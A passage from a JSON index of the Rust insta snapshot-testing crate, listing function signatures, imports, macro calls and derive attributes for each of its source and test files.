          "// | File, redacted, named, debug expr | `assert_yaml_snapshot!(\"name\", expr, {\"",
          "assert_yaml_snapshot!(",
          "assert_yaml_snapshot!("
        ],
        "derives": [
          "#[derive(Serialize)]",
          "#[derive(Serialize)]",
          "#[derive(Serialize)]",
          "#[derive(Serialize)]",
          "#[derive(Serialize)]",
          "#[derive(Serialize)]",
          "#[derive(Serialize)]",
          "#[derive(Serialize, Hash, PartialEq, PartialOrd, Eq, Ord)]",
          "#[derive(Serialize)]",
          "#[derive(Debug, Serialize)]",
          "#[derive(Debug, Serialize)]",
          "#[derive(Debug, Serialize)]",
          "#[derive(Debug, Serialize)]",
          "#[derive(Serialize, Debug)]",
          "#[derive(Serialize, Debug)]"
        ],
        "error_handling": 10
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/tests/test_glob.rs",
        "function_defs": [
          "fn test_basic_globbing() {",
          "fn test_basic_globbing_nested() {",
          "fn test_globs_follow_links() {",
          "fn test_empty_glob_fails() {",
          "fn test_parent_dir_glob_fails_with_helpful_message() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "insta::glob!(\"inputs/*.txt\", |path| {",
          "insta::assert_json_snapshot!(&contents);",
          "insta::glob!(\"inputs-nested/*/*.txt\", |path| {",
          "insta::assert_snapshot!(&contents);",
          "insta::glob!(\"link-to-inputs/*.txt\", |path| {",
          "insta::assert_json_snapshot!(&contents);",
          "insta::glob!(\"nonexistent\", |_| {",
          "insta::glob!(\"../**/*.rs\", |_| {"
        ],
        "derives": [],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/tests/test_binary.rs",
        "function_defs": [
          "fn test_binary_snapshot() {",
          "fn test_new_extension() {",
          "fn test_malformed_name_and_extension() {",
          "fn test_extension_starting_with_new() {",
          "fn test_multipart_extension() {",
          "fn test_named() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "insta::assert_binary_snapshot!(\".txt\", b\"test\".to_vec());",
          "insta::assert_binary_snapshot!(\".new\", b\"test\".to_vec());",
          "insta::assert_binary_snapshot!(\"test\", b\"test\".to_vec());",
          "insta::assert_binary_snapshot!(\".new.gz\", b\"test\".to_vec());",
          "insta::assert_binary_snapshot!(\".tar.gz\", b\"test\".to_vec());",
          "insta::assert_binary_snapshot!(\"name.json\", b\"null\".to_vec());"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/src/runtime.rs",
        "function_defs": [
          "fn from((_, content): (AutoName, &'a str)) -> Self {",
          "fn from((name, content): (Option<String>, &'a str)) -> Self {",
          "fn from((name, content): (String, &'a str)) -> Self {",
          "fn from((name, content): (Option<&'a str>, &'a str)) -> Self {",
          "fn from((name, content): (&'a str, &'a str)) -> Self {",
          "fn from((InlineValue(reference_content), content): (InlineValue<'a>, &'a str)) -> Self {",
          "fn from(",
          "fn is_doctest(function_name: &str) -> bool {",
          "fn detect_snapshot_name(function_name: &str, module_path: &str) -> Result<String, &'static str> {",
          "fn add_suffix_to_snapshot_name(name: Cow<'_, str>) -> Cow<'_, str> {",
          "fn get_snapshot_filename(",
          "fn prepare(",
          "fn print_snapshot_info(&self, new_snapshot: &Snapshot) {",
          "fn finalize(&self, update_result: SnapshotUpdateBehavior) {",
          "fn path_relative_from(path: &Path, base: &Path) -> Option<PathBuf> {",
          "fn prevent_inline_duplicate(function_name: &str, assertion_file: &str, assertion_line: u32) {",
          "fn record_snapshot_duplicate(",
          "fn allow_duplicates() -> bool {"
        ],
        "struct_defs": [
          "struct SnapshotAssertionContext<'a> {"
        ],
        "impl_blocks": [],
        "uses": [
          "use std::cell::RefCell;",
          "use std::collections::{BTreeMap, BTreeSet};",
          "use std::error::Error;",
          "use std::fs;",
          "use std::io::{ErrorKind, Write};",
          "use std::path::{Path, PathBuf};",
          "use std::rc::Rc;",
          "use std::str;",
          "use std::sync::{Arc, Mutex};",
          "use std::{borrow::Cow, env};",
          "use crate::settings::Settings;",
          "use crate::snapshot::{",
          "use crate::utils::{path_to_storage, style};",
          "use crate::{env::get_tool_config, output::SnapshotPrinter};",
          "use crate::{",
          "use once_cell::sync::Lazy;",
          "use std::fmt::Write;",
          "use std::path::Component;"
        ],
        "macros": [
          "() => (write!(std::io::stderr()).ok());",
          "writeln!(std::io::stderr(), $($arg)*).ok();",
          "eprintln!($($tokens)*);",
          "eprintln!();",
          "panic!($($tokens)*);",
          "panic!(\"\\\"{name_and_extension}\\\" does not match the format \\\"name.extension\\\"\",)",
          "let key = format!(\"{}::{}\", module_path.replace(\"::\", \"__\"), name);",
          "panic!(",
          "format!(\"{name}-{test_idx}\")",
          ".map(|suffix| Cow::Owned(format!(\"{name}@{suffix}\")))",
          "write!(",
          "write!(&mut f, \"{}__\", module_path.replace(\"::\", \"__\")).unwrap();",
          "write!(",
          "panic!(\"Cannot determine reliable names for snapshot in doctests.  Please use ex",
          "duplication_key = Some(format!(\"named:{module_path}|{name}\"));",
          "duplication_key = Some(format!(",
          "pending_file.set_file_name(format!(",
          "assert_eq!(",
          "matches!(self.snapshot_kind, SnapshotKind::Binary { .. })",
          "let file_name_prefix = format!(\"{}.new.\", path.file_name().unwrap().to_str().unw",
          "elog!(",
          "unreachable!()",
          "elog!(",
          "elog!(",
          "println!(",
          "println!(\"{hint}\", hint = style(msg).dim(),);",
          "print_or_panic!(",
          "panic!(",
          "let key = format!(\"{function_name}|{assertion_file}|{assertion_line}\");",
          "panic!(",
          "println!(\"Snapshots in allow-duplicates block do not match.\");",
          "panic!(",
          "assert!(",
          "assert!(",
          "if matches!(",
          "///     insta::assert_debug_snapshot!(\"named\", vec![1, 2, 3, 4, 5]);",
          "/// insta::assert_debug_snapshot!(vec![1, 2, 3, 4, 5]);",
          "/// insta::assert_snapshot!(some_string, @\"Coucou je suis un joli bug\");",
          "/// insta::assert_snapshot!(some_string, @\"Coucou je suis un joli bug\");"
        ],
        "derives": [
          "#[derive(Debug)]",
          "#[derive(Debug)]"
        ],
        "error_handling": 46
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/src/test.rs",
        "function_defs": [
          "fn test_embedded_test() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "assert_snapshot!(\"embedded\", \"Just a string\");"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/src/env.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {",
          "fn get_cargo_workspace_from_metadata(",
          "fn test_get_cargo_workspace_manifest_dir() {",
          "fn test_get_cargo_workspace_insta_workspace() {",
          "fn from_str(value: &str) -> Result<TestRunner, ()> {",
          "fn from_str(value: &str) -> Result<UnreferencedSnapshots, ()> {",
          "fn resolve<'a>(value: &'a Content, path: &[&str]) -> Option<&'a Content> {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl TestRunner {",
          "impl fmt::Display for Error {",
          "impl std::error::Error for Error {",
          "impl ToolConfig {",
          "impl ToolConfig {",
          "impl std::str::FromStr for TestRunner {",
          "impl std::str::FromStr for UnreferencedSnapshots {"
        ],
        "uses": [
          "use std::collections::BTreeMap;",
          "use std::io::Write;",
          "use std::path::{Path, PathBuf};",
          "use std::sync::{Arc, Mutex};",
          "use std::{env, fmt, fs};",
          "use crate::utils::is_ci;",
          "use crate::{",
          "use once_cell::sync::Lazy;",
          "use crate::utils::get_cargo;"
        ],
        "macros": [
          ".unwrap_or_else(|e| panic!(\"Error building config from {workspace_dir:?}: {e}\"))",
          "Error::Deserialize(_) => write!(f, \"failed to deserialize tool config\"),",
          "Error::Env(var) => write!(f, \"invalid value for env var '{var}'\"),",
          "Error::Config(var) => write!(f, \"invalid value for config '{var}'\"),",
          "//   elog!(\"INSTA_FORCE_UPDATE is deprecated, use",
          "elog!(\"INSTA_FORCE_UPDATE_SNAPSHOTS is deprecated, use INSTA_UPDATE=force. (If r",
          "elog!(\"`force_update: true` is deprecated in insta config files, use `update: fo",
          "eprintln!(\"cargo metadata failed in {manifest_dir}: {e}\");",
          "eprintln!(\"will use manifest directory as fallback\");",
          "return Err(format!(\"command failed with {}: {stderr}\", output.status).into());",
          "std::str::from_utf8(&output.stdout).map_err(|e| format!(\"invalid UTF-8 in output",
          ".map_err(|e| format!(\"failed to parse YAML: {e}\"))?;",
          "let workspace = get_cargo_workspace(Workspace::DetectWithCargo(env!(\"CARGO_MANIF",
          "let manifest_dir = PathBuf::from(env!(\"CARGO_MANIFEST_DIR\"));",
          "assert!(manifest_dir.starts_with(&*workspace));",
          "assert!(workspace.ends_with(\"insta_workspace_root\"));",
          "f.write_all(format!(\"{}\\n\", snapshot_file.display()).as_bytes())"
        ],
        "derives": [
          "#[derive(Clone, Copy, Debug, PartialEq, Eq, clap::ValueEnum)]",
          "#[derive(Clone, Copy, Debug, PartialEq, Eq)]",
          "#[derive(Clone, Copy, Debug, PartialEq, Eq, clap::ValueEnum)]",
          "#[derive(Clone, Copy, Debug, PartialEq, Eq)]",
          "#[derive(Debug)]",
          "#[derive(Debug, Clone)]",
          "#[derive(Clone, Copy, Debug, PartialEq, Eq)]"
        ],
        "error_handling": 34
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/src/lib.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "//!     insta::assert_debug_snapshot!(vec![1, 2, 3]);",
          "//!     assert_debug_snapshot!(vec![1, 2, 3]);",
          "//! for the snapshot macros is `assert_snapshot!(reference_value, @\"snapshot\")`.",
          "//! assert_snapshot!(2 + 2, @\"\");"
        ],
        "derives": [],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/src/redaction.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn from(value: $ty) -> Redaction {",
          "fn from(value: &'a str) -> Redaction {",
          "fn from(value: &'a [u8]) -> Redaction {",
          "fn sort(mut value: Content, _path: ContentPath) -> Content {",
          "fn redact(&self, value: Content, path: &[PathItem]) -> Content {",
          "fn as_str(&self) -> Option<&str> {",
          "fn as_u64(&self) -> Option<u64> {",
          "fn range_check(&self, start: Option<i64>, end: Option<i64>) -> bool {",
          "fn expand_range(sel: i64, len: i64) -> i64 {",
          "fn segment_is_match(&self, segment: &Segment, element: &PathItem) -> bool {",
          "fn selector_is_match(&self, selector: &[Segment], path: &[PathItem]) -> bool {",
          "fn redact_seq(",
          "fn redact_struct(",
          "fn redact_impl(",
          "fn test_range_checks() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl SelectorParseError {",
          "impl fmt::Display for ContentPath<'_> {",
          "impl From<$ty> for Redaction {",
          "impl Redaction {",
          "impl PathItem {"
        ],
        "uses": [
          "use pest::Parser;",
          "use pest_derive::Parser;",
          "use std::borrow::Cow;",
          "use std::fmt;",
          "use crate::content::Content;",
          "use similar_asserts::assert_eq;"
        ],
        "macros": [
          "write!(f, \".\")?;",
          "write!(f, \"{s}\")?;",
          "write!(f, \"<content>\")?;",
          "PathItem::Field(name) => write!(f, \"{name}\")?,",
          "PathItem::Index(idx, _) => write!(f, \"{idx}\")?,",
          "impl_from!(());",
          "impl_from!(bool);",
          "impl_from!(u8);",
          "impl_from!(u16);",
          "impl_from!(u32);",
          "impl_from!(u64);",
          "impl_from!(i8);",
          "impl_from!(i16);",
          "impl_from!(i32);",
          "impl_from!(i64);",
          "impl_from!(f32);",
          "impl_from!(f64);",
          "impl_from!(char);",
          "impl_from!(String);",
          "impl_from!(Vec<u8>);",
          "///     assert_eq!(path.to_string(), \".id\");",
          "///     assert_eq!(",
          "other => assert_eq!(other, Rule::selector),",
          "_ => unreachable!(),",
          "_ => unreachable!(),",
          "assert_eq!(PathItem::Index(0, 10).range_check(None, Some(-1)), true);",
          "assert_eq!(PathItem::Index(9, 10).range_check(None, Some(-1)), false);",
          "assert_eq!(PathItem::Index(0, 10).range_check(Some(1), Some(-1)), false);",
          "assert_eq!(PathItem::Index(1, 10).range_check(Some(1), Some(-1)), true);",
          "assert_eq!(PathItem::Index(9, 10).range_check(Some(1), Some(-1)), false);",
          "assert_eq!(PathItem::Index(0, 10).range_check(Some(1), None), false);",
          "assert_eq!(PathItem::Index(1, 10).range_check(Some(1), None), true);",
          "assert_eq!(PathItem::Index(9, 10).range_check(Some(1), None), true);"
        ],
        "derives": [
          "#[derive(Debug)]",
          "#[derive(Clone, Debug)]",
          "#[derive(Parser)]",
          "#[derive(Debug)]",
          "#[derive(Debug, Clone, PartialEq, Eq)]",
          "#[derive(Debug, Clone)]"
        ],
        "error_handling": 29
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/src/serialization.rs",
        "function_defs": [
          "fn test_yaml_serialization() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use serde::de::value::Error as ValueError;",
          "use serde::Serialize;",
          "use crate::content::{json, yaml, Content, ContentSerializer};",
          "use crate::settings::Settings;"
        ],
        "macros": [
          "crate::assert_snapshot!(&yaml, @r\"",
          "crate::assert_snapshot!(&inline_yaml, @r\""
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 11
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/src/snapshot.rs",
        "function_defs": [
          "fn from_content(content: Content) -> Result<PendingInlineSnapshot, Box<dyn Error>> {",
          "fn as_content(&self) -> Content {",
          "fn from_content(content: Content) -> Result<MetaData, Box<dyn Error>> {",
          "fn as_content(&self) -> Content {",
          "fn trim_for_persistence(&self) -> Cow<'_, MetaData> {",
          "fn from_content(content: Content, kind: TextSnapshotKind) -> Result<Snapshot, Box<dyn Error>> {",
          "fn as_content(&self) -> Content {",
          "fn serialize_snapshot(&self, md: &MetaData) -> String {",
          "fn save_with_metadata(&self, path: &Path, md: &MetaData) -> Result<(), Box<dyn Error>> {",
          "fn from(value: TextSnapshotContents) -> Self {",
          "fn as_str_legacy(sc: &TextSnapshotContents) -> String {",
          "fn normalize(&self) -> String {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn eq(&self, other: &Self) -> bool {",
          "fn build_binary_path(extension: &str, path: impl Into<PathBuf>) -> PathBuf {",
          "fn required_hashes(text: &str) -> usize {",
          "fn test_required_hashes() {",
          "fn leading_space(value: &str) -> String {",
          "fn min_indentation(snapshot: &str) -> String {",
          "fn normalize_inline_snapshot(snapshot: &str) -> String {",
          "fn names_of_path(path: &Path) -> (String, String) {",
          "fn test_names_of_path() {",
          "fn legacy_inline_normalize(frozen_value: &str) -> String {",
          "fn test_snapshot_contents() {",
          "fn test_snapshot_contents_hashes() {",
          "fn test_normalize_inline_snapshot() {",
          "fn test_min_indentation() {",
          "fn test_inline_snapshot_value_newline() {",
          "fn test_parse_yaml_error() {",
          "fn test_ownership() {",
          "fn test_empty_lines() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl PendingInlineSnapshot {",
          "impl MetaData {",
          "impl Snapshot {",
          "impl From<TextSnapshotContents> for SnapshotContents {",
          "impl SnapshotContents {",
          "impl TextSnapshotContents {",
          "impl fmt::Display for TextSnapshotContents {",
          "impl PartialEq for SnapshotContents {"
        ],
        "uses": [
          "use crate::{",
          "use once_cell::sync::Lazy;",
          "use std::env;",
          "use std::error::Error;",
          "use std::fs;",
          "use std::io::{BufRead, BufReader, Write};",
          "use std::path::{Path, PathBuf};",
          "use std::rc::Rc;",
          "use std::time::{SystemTime, UNIX_EPOCH};",
          "use std::{borrow::Cow, fmt};",
          "use similar_asserts::assert_eq;",
          "use similar_asserts::assert_eq;",
          "use similar_asserts::assert_eq;",
          "use std::env::temp_dir;",
          "use std::ops::Range;"
        ],
        "macros": [
          "format!(\"{}-{}\", d.as_secs(), d.subsec_nanos())",
          "elog!(\"A snapshot uses a legacy snapshot format; please update it to the new for",
          "matches!(self, SnapshotContents::Binary(_))",
          "out.push_str(format!(\"{contents:?}\").as_str());",
          "format!(",
          ".chain(Some(format!(\"\\n{indentation}\"))),",
          "write!(f, \"{}\", self.normalize())",
          "elog!(\"{} {}\\n{}\",style(\"Snapshot test passes but the existing value is in a leg",
          "assert_snapshot!(required_hashes(\"\"), @\"0\");",
          "assert_snapshot!(required_hashes(\"Hello, world!\"), @\"0\");",
          "assert_snapshot!(required_hashes(\"\\\"\\\"\"), @\"1\");",
          "assert_snapshot!(required_hashes(\"##\"), @\"0\");",
          "assert_snapshot!(required_hashes(\"\\\"#\\\"#\"), @\"2\");",
          "assert_snapshot!(required_hashes(r##\"\"#\"##), @\"2\");",
          "assert_snapshot!(required_hashes(r######\"foo \"\"##### bar \"###\" baz\"######), @\"6\"",
          "assert_snapshot!(required_hashes(\"\\\"\\\"\\\"\"), @\"1\");",
          "assert_snapshot!(required_hashes(\"####\"), @\"0\");",
          "assert_snapshot!(required_hashes(r###\"\\\"\\\"##\\\"\\\"\"###), @\"3\");",
          "assert_snapshot!(required_hashes(r###\"r\"#\"Raw string\"#\"\"###), @\"2\");",
          "assert_debug_snapshot!(",
          "assert_debug_snapshot!(",
          "assert_debug_snapshot!(",
          "assert_eq!(snapshot_contents.to_inline(\"\"), r#\"\"testing\"\"#);",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(normalize_inline_snapshot(\"\"), \"\");",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(min_indentation(t), \"   \".to_string());",
          "assert_eq!(min_indentation(t), \"    \".to_string());",
          "assert_eq!(min_indentation(t), \"            \".to_string());",
          "assert_eq!(min_indentation(t), \"   \".to_string());",
          "assert_eq!(min_indentation(t), \"        \".to_string());",
          "assert_eq!(min_indentation(t), \"\".to_string());",
          "assert_eq!(min_indentation(t), \"\".to_string());",
          "assert_eq!(min_indentation(t), \"\".to_string());",
          "assert_eq!(min_indentation(t), \"    \".to_string());",
          "assert_eq!(min_indentation(t), \"\".to_string());",
          "assert_eq!(min_indentation(t), \" \t\".to_string());",
          "assert_eq!(min_indentation(t), \"  \t\".to_string());",
          "assert_eq!(min_indentation(t), \"\t\".to_string());",
          "assert_eq!(normalize_inline_snapshot(\"\\n\"), \"\");",
          "let error = format!(\"{}\", Snapshot::from_file(temp.as_path()).unwrap_err());",
          "assert!(error.contains(\"Failed parsing the YAML from\"));",
          "assert!(error.contains(\"bad.yaml\"));",
          "assert_debug_snapshot!(r, @\"0..10\");",
          "assert_debug_snapshot!(r, @\"0..10\");",
          "assert_snapshot!(r#\"single line should fit on a single line\"#, @\"single line sho",
          "assert_snapshot!(r#\"single line should fit on a single line, even if it's really",
          "assert_snapshot!(r#\"multiline content starting on first line",
          "assert_snapshot!(r#\""
        ],
        "derives": [
          "#[derive(Debug)]",
          "#[derive(Debug, Clone, PartialEq, Default)]",
          "#[derive(Debug, Default, Clone, PartialEq)]",
          "#[derive(Debug, PartialEq, Eq, Clone, Copy)]",
          "#[derive(Debug, Clone)]",
          "#[derive(Debug, Clone)]",
          "#[derive(Debug, PartialEq, Eq, Clone)]"
        ],
        "error_handling": 59
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/src/filters.rs",
        "function_defs": [
          "fn from(value: I) -> Self {",
          "fn from_iter<I: IntoIterator<Item = (&'a str, &'a str)>>(iter: I) -> Self {",
          "fn test_filters() {",
          "fn test_static_str_array_conversion() {",
          "fn test_vec_str_conversion() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Filters {"
        ],
        "uses": [
          "use std::borrow::Cow;",
          "use std::iter::FromIterator;",
          "use std::iter::IntoIterator;",
          "use regex::Regex;"
        ],
        "macros": [
          "assert_eq!("
        ],
        "derives": [
          "#[derive(Debug, Default, Clone)]"
        ],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/src/output.rs",
        "function_defs": [
          "fn print_snapshot_diff(&self) {",
          "fn print_snapshot_summary(&self) {",
          "fn print_info(&self) {",
          "fn print_snapshot(&self) {",
          "fn print_changeset(&self) {",
          "fn print_line(width: usize) {",
          "fn trailing_newline(s: &str) -> &str {",
          "fn detect_newlines(s: &str) -> (bool, bool, bool) {",
          "fn newlines_matter(left: &str, right: &str) -> bool {",
          "fn render_invisible(s: &str, newlines_matter: bool) -> Cow<'_, str> {",
          "fn print_info(metadata: &MetaData) {",
          "fn encode_file_link_escape(path: &Path) -> String {",
          "fn test_invisible() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::borrow::Cow;",
          "use std::{path::Path, time::Duration};",
          "use similar::{Algorithm, ChangeTag, TextDiff};",
          "use crate::content::yaml;",
          "use crate::snapshot::{MetaData, Snapshot, SnapshotContents};",
          "use crate::utils::{format_rust_expression, style, term_width};"
        ],
        "macros": [
          "println!(",
          "title = style(format!(\" {title} \")).bold(),",
          "println!(\"Snapshot Contents:\");",
          "println!(\"\u2500\u2500\u2500\u2500\u2500\u2500\u252c{:\u2500^1$}\", \"\", width.saturating_sub(7));",
          "println!(\"{:>5} \u2502 {}\", style(idx + 1).cyan().dim().bold(), line);",
          "println!(\"\u2500\u2500\u2500\u2500\u2500\u2500\u2534{:\u2500^1$}\", \"\", width.saturating_sub(7));",
          "println!(",
          "println!(",
          "style(format_args!(",
          "println!(",
          "style(format_args!(",
          "println!(",
          "style(format_args!(\"-{}\", self.old_snapshot_hint)).red()",
          "println!(",
          "style(format_args!(\"+{}\", self.new_snapshot_hint)).green()",
          "println!(\"\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c{:\u2500^1$}\", \"\", width.saturating_sub(13));",
          "println!(\"\u2508\u2508\u2508\u2508\u2508\u2508\u2508\u2508\u2508\u2508\u2508\u2508\u253c{:\u2508^1$}\", \"\", width.saturating_sub(13));",
          "print!(",
          "print!(\"{}\", style(change).green().underlined());",
          "print!(\"{}\", style(change).green());",
          "print!(",
          "print!(\"{}\", style(change).red().underlined());",
          "print!(\"{}\", style(change).red());",
          "print!(",
          "print!(\"{}\", style(change).dim());",
          "println!();",
          "println!(",
          "println!(\"\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534{:\u2500^1$}\", \"\", width.saturating_sub(13));",
          "println!(",
          "println!(\"Snapshot: {}\", style(name).yellow());",
          "println!(\"Snapshot: {}\", style(\"<inline>\").dim());",
          "println!(",
          ".map(|line| format!(\":{}\", style(line).bold()))",
          "println!(\"Input file: {}\", style(value).cyan());",
          "println!(\"{:\u2500^1$}\", \"\", width);",
          "!matches!(",
          "println!(\"Expression: {}\", style(format_rust_expression(expr)));",
          "println!(\"{descr}\");",
          "println!(\"{}\", out.trim().strip_prefix(\"---\").unwrap().trim_start());",
          "assert!(path.is_absolute());",
          "format!(",
          "assert_eq!("
        ],
        "derives": [],
        "error_handling": 15
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/src/macros.rs",
        "function_defs": [
          "fn f() {}",
          "fn type_name_of_val<T>(_: T) -> &'static str {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use $crate::_macro_support::{env, option_env};",
          "use $crate::_macro_support::path::Path;"
        ],
        "macros": [
          "// Note the `env!(\"CARGO_MANIFEST_DIR\")` needs to be in the macro (in",
          "const WORKSPACE_ROOT: $crate::_macro_support::Workspace = if let Some(root) = op",
          "$crate::_macro_support::Workspace::DetectWithCargo(env!(\"CARGO_MANIFEST_DIR\"))",
          "/// insta::assert_csv_snapshot!(vec![1, 2, 3]);",
          "$crate::_assert_serialized_snapshot!(format=Csv, $($arg)*);",
          "/// insta::assert_toml_snapshot!(vec![1, 2, 3]);",
          "$crate::_assert_serialized_snapshot!(format=Toml, $($arg)*);",
          "/// assert_yaml_snapshot!(vec![1, 2, 3]);",
          "/// assert_yaml_snapshot!(value, {",
          "$crate::_assert_serialized_snapshot!(format=Yaml, $($arg)*);",
          "/// assert_ron_snapshot!(vec![1, 2, 3]);",
          "$crate::_assert_serialized_snapshot!(format=Ron, $($arg)*);",
          "/// assert_json_snapshot!(vec![1, 2, 3]);",
          "$crate::_assert_serialized_snapshot!(format=Json, $($arg)*);",
          "/// assert_compact_json_snapshot!(vec![1, 2, 3]);",
          "$crate::_assert_serialized_snapshot!(format=JsonCompact, $($arg)*);",
          "$crate::_prepare_snapshot_for_redaction!(value, {$($k => $v),*}, $format)",
          "$crate::_assert_snapshot_base!(transform=transform, $value $($arg)*);",
          "$crate::_prepare_snapshot_for_redaction!(value, {$($k => $v),*}, $format)",
          "$crate::_assert_snapshot_base!(transform=transform, $name, $value, $debug_expr);",
          "$crate::_prepare_snapshot_for_redaction!(value, {$($k => $v),*}, $format)",
          "$crate::_assert_snapshot_base!(transform=transform, $name, $value);",
          "$crate::_assert_snapshot_base!(transform=transform, $($arg)*);",
          "compile_error!(",
          "$crate::_assert_snapshot_base!(transform=|v| $crate::_macro_support::format!(\"{:",
          "$crate::_assert_snapshot_base!(transform=|v| $crate::_macro_support::format!(\"{:",
          "$crate::_assert_snapshot_base!(",
          "$crate::_assert_snapshot_base!(transform = $transform, $name, $value, stringify!",
          "$crate::_assert_snapshot_base!(",
          "$crate::_get_workspace_root!().as_path(),",
          "$crate::_function_name!(),",
          "$crate::_macro_support::module_path!(),",
          "$crate::_macro_support::file!(),",
          "$crate::_macro_support::line!(),",
          "/// insta::assert_binary_snapshot!(\".txt\", b\"abcd\".to_vec());",
          "/// insta::assert_binary_snapshot!(\"my_snapshot.bin\", [0, 1, 2, 3].to_vec());",
          "$crate::assert_binary_snapshot!($name_and_extension, $value, stringify!($value))",
          "$crate::_get_workspace_root!().as_path(),",
          "$crate::_function_name!(),",
          "$crate::_macro_support::module_path!(),",
          "$crate::_macro_support::file!(),",
          "$crate::_macro_support::line!(),",
          "#[deprecated = \"use assert_snapshot!() instead\"]",
          "$crate::assert_snapshot!($($arg)*)",
          "/// assert_snapshot!(\"reference value to snapshot\");",
          "/// assert_snapshot!(\"snapshot_name\", \"reference value to snapshot\");",
          "/// assert_snapshot!(\"reference value\", @\"reference value\");",
          "$crate::_assert_snapshot_base!(transform=|v| $crate::_macro_support::format!(\"{}",
          "/// insta::with_settings!({sort_maps => true}, {",
          "/// glob!(\"inputs/*.txt\", |path| {",
          "///     assert_snapshot!(input.to_uppercase());",
          "/// glob!(\"../test_data\", \"inputs/*.txt\", |path| {",
          "///     assert_snapshot!(input.to_uppercase());",
          "// `glob!(\"../test_data/inputs/*.txt\"...`.",
          "let base = $crate::_get_workspace_root!()",
          ".join(Path::new(file!()).parent().unwrap())",
          "$crate::_get_workspace_root!().as_path(),",
          "$crate::glob!(\".\", $glob, $closure)",
          "///         insta::assert_debug_snapshot!(is_even, @\"true\");"
        ],
        "derives": [],
        "error_handling": 27
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/src/settings.rs",
        "function_defs": [
          "fn from(value: Vec<(&'a str, Redaction)>) -> Redactions {",
          "fn default() -> Settings {",
          "fn add_redaction_impl(&mut self, selector: &str, replacement: Redaction) {",
          "fn poll(self: Pin<&mut Self>, cx: &mut Context) -> Poll<Self::Output> {",
          "fn drop(&mut self) {"
        ],
        "struct_defs": [
          "struct BindingFuture<F> {"
        ],
        "impl_blocks": [
          "impl ActualSettings {",
          "impl Default for Settings {",
          "impl Settings {",
          "impl Drop for SettingsBindDropGuard {"
        ],
        "uses": [
          "use once_cell::sync::Lazy;",
          "use serde::{de::value::Error as ValueError, Serialize};",
          "use std::cell::RefCell;",
          "use std::future::Future;",
          "use std::mem;",
          "use std::path::{Path, PathBuf};",
          "use std::pin::Pin;",
          "use std::sync::Arc;",
          "use std::task::{Context, Poll};",
          "use crate::content::Content;",
          "use crate::content::ContentSerializer;",
          "use crate::filters::Filters;",
          "use crate::redaction::{dynamic_redaction, sorted_redaction, ContentPath, Redaction, Selector};"
        ],
        "macros": [
          "thread_local!(static CURRENT_SETTINGS: RefCell<Settings> = RefCell::new(Settings",
          "///     insta::assert_snapshot!(...);"
        ],
        "derives": [
          "#[derive(Clone, Default)]",
          "#[derive(Clone)]",
          "#[derive(Clone)]"
        ],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/src/glob.rs",
        "function_defs": [
